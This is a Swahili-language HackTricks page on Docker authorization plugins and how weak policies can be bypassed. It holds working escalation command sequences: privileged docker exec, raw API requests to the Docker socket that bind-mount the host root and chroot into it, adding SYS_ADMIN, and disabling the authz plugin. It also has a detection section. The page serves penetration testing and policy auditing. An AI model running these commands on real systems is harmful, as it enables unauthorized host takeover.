# Plugins za Uidhinishaji za Runtime

{{#include ../../../banners/hacktricks-training.md}}

## Muhtasari

Runtime authorization plugins ni tabaka la sera linaloamua ikiwa muombaji anaweza kufanya kitendo fulani cha daemon. Docker ni mfano wa kawaida. Kwa chaguo-msingi, yeyote anayeweza kuwasiliana na Docker daemon ana udhibiti mpana juu yake. Authorization plugins hujaribu kupunguza mtindo huo kwa kuchunguza mtumiaji aliethibitishwa na operesheni ya API iliyohitajika, kisha kuruhusu au kukataa ombi kulingana na sera.

Mada hii inastahili ukurasa wake kwa sababu inabadilisha mfano wa exploitation wakati mshambuliaji tayari ana ufikiaji wa Docker API au kwa mtumiaji katika kikundi cha `docker`. Katika mazingira kama hayo swali haliko tena tu "can I reach the daemon?" bali pia "is the daemon fenced by an authorization layer, and if so, can that layer be bypassed through unhandled endpoints, weak JSON parsing, or plugin-management permissions?"

## Operesheni

Wakati ombi linapofikia Docker daemon, subsystem ya authorization inaweza kupitisha muktadha wa ombi kwa plugin(i) moja au zaidi zilizosakinishwa. Plugin inaona utambulisho wa mtumiaji aliethibitishwa, maelezo ya ombi, headers zilizochaguliwa, na sehemu za mwili wa ombi au mwitikio wakati content type inafaa. Plugin nyingi zinaweza kuunganishwa mnyororo, na ufikiaji hutolewa tu ikiwa plugin zote zinakubali ombi.

Mfano huu unaonekana imara, lakini usalama wake unategemea kabisa jinsi mwandishi wa sera alivyofahamu API kikamilifu. Plugin inayozuia `docker run --privileged` lakini kusahau `docker exec`, kupuuzia vigezo mbadala vya JSON kama top-level `Binds`, au kuruhusu usimamizi wa plugin inaweza kuunda hisia ya uwongo ya vizuizi huku ikiacha njia za moja kwa moja za privilege-escalation zilizo wazi.

## Malengo ya kawaida ya plugin

Maeneo muhimu kwa ukaguzi wa sera ni:

- endpoints za uundaji wa container
- fields za `HostConfig` kama `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode`, na chaguzi za kushirikisha namespace
- tabia ya `docker exec`
- endpoints za usimamizi wa plugin
- endpoint yoyote inaweza kwa njia isiyo ya moja kwa moja kusababisha vitendo vya runtime nje ya modeli ya sera iliyokusudiwa

Kihistoria, mifano kama `authz` ya Twistlock na plugins rahisi za kielimu kama `authobot` yalifanya mfano huu uwe rahisi kusoma kwa sababu mafaili yao ya sera na njia za msimbo zilionyesha jinsi ramani ya endpoint-kwa-kitendo ilivyotekelezwa kweli. Kwa kazi za assessment, somo muhimu ni kwamba mwandishi wa sera lazima afahamu uso mzima wa API badala ya amri za CLI zinazovaa juu tu.

## Matumizi mabaya

Lengo la kwanza ni kujifunza ni nini hasa kinazuiwa. Ikiwa daemon inapiga marufuku kitendo, hitilafu mara nyingi leaks jina la plugin, ambalo husaidia kutambua udhibiti unaotumika:
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
Ikiwa unahitaji profiling mpana wa endpoint, zana kama `docker_auth_profiler` zinafaa kwa sababu zinaotomatisha kazi ya kurudia ya kukagua ni API routes na JSON structures gani zinazoruhusiwa kwa kweli na plugin.

Ikiwa mazingira yanatumia custom plugin na unaweza kuingiliana na API, taja ni object fields gani zinachujwa kwa kweli:
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
Uhakiki huu ni muhimu kwa sababu makosa mengi ya idhini ni maalum kwa nyanja badala ya dhana kwa ujumla. plugin inaweza kukataa muundo wa CLI bila kuzuia kabisa muundo sawa wa API.

### Mfano Kamili: `docker exec` Inaongeza Vibali Baada ya Uundaji wa Container

Sera inayozuia uundaji wa container zenye vibali lakini inaruhusu uundaji wa container zisizo na vizuizi pamoja na `docker exec` inaweza bado kuzungukwa:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
Iwapo daemon itakubali hatua ya pili, mtumiaji amepata tena privileged interactive process ndani ya container ambayo mwandishi wa sera alidhani ilikuwa imezuiliwa.

### Mfano Kamili: Bind Mount Through Raw API

Baadhi ya sera zilizoharibika huchunguza tu muundo mmoja wa JSON. Ikiwa root filesystem bind mount haitazuiwi kwa uthabiti, host bado inaweza kuwekwa (mounted):
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
Wazo lile lile pia linaweza kuonekana chini ya `HostConfig`:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
Athari ni kutoroka kamili kutoka kwenye mfumo wa faili wa mwenyeji. Jambo la kuvutia ni kwamba bypass inatokana na upungufu wa ufunikaji wa sera badala ya hitilafu ya kernel.

### Mfano Kamili: Sifa ya Capability Isiyokaguliwa

Ikiwa sera itasahau kuchuja sifa inayohusiana na capability, mshambuliaji anaweza kuunda container inayorejesha capability hatari:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
Mara tu `CAP_SYS_ADMIN` au capability yenye nguvu sawa inapoonekana, mbinu nyingi za breakout zilizotajwa katika [capabilities.md](protections/capabilities.md) na [privileged-containers.md](privileged-containers.md) zinaweza kufikiwa.

### Mfano Kamili: Kuzima Plugin

Ikiwa operesheni za plugin-management zinazoruhusiwa, njia safi zaidi ya bypass inaweza kuwa kuzima udhibiti kabisa:
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
Hii ni hitilafu ya sera kwenye ngazi ya control-plane. Tabaka la idhini lipo, lakini mtumiaji ambaye ilipaswa kumzuia bado anamiliki ruhusa ya kuizima.

## Ukaguzi

Amri hizi zinalenga kubaini ikiwa tabaka la sera lipo na ikiwa linaonekana kuwa kamili au la uso tu.
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
Kile kinachovutia hapa:

- Ujumbe za kukataa zinazojumuisha jina la plugin zinathibitisha kuwepo kwa authorization layer na mara nyingi zinafunua utekelezaji sahihi.
- Orodha ya plugin inayoonekana kwa mshambuliaji inaweza kutosha kugundua iwezekanavyo kuzima au kubadilisha usanidi.
- Sera inayozuia vitendo vya wazi vya CLI tu lakini si raw API requests inapaswa kuchukuliwa kuwa inaweza kupitishwa hadi ithibitishwe vinginevyo.

## Mipangilio ya chaguo-msingi ya Runtime

| Runtime / platform | Hali ya chaguo-msingi | Tabia ya chaguo-msingi | Udhaifu wa kawaida unaofanywa kwa mkono |
| --- | --- | --- | --- |
| Docker Engine | Haijawezeshwa kwa chaguo-msingi | Ufikiaji wa Daemon kwa ufanisi ni yote-au-hapana isipokuwa authorization plugin itakapowekwa | sera ya plugin isiyokamilika, blacklists badala ya allowlists, kuruhusu plugin management, field-level blind spots |
| Podman | Sio sawa moja kwa moja ya kawaida | Podman kawaida hutegemea zaidi Unix permissions, rootless execution, na maamuzi ya API exposure kuliko authz plugins za mtindo wa Docker | exposing a rootful Podman API broadly, weak socket permissions |
| containerd / CRI-O | Mfumo tofauti wa udhibiti | Runtimes hizi kawaida hutegemea socket permissions, node trust boundaries, na udhibiti wa orchestrator wa ngazi ya juu badala ya Docker authz plugins | mounting the socket into workloads, weak node-local trust assumptions |
| Kubernetes | Inatumia authn/authz katika API-server na kubelet layers, sio Docker authz plugins | Cluster RBAC na admission controls ndio tabaka kuu la sera | overbroad RBAC, weak admission policy, exposing kubelet or runtime APIs directly |
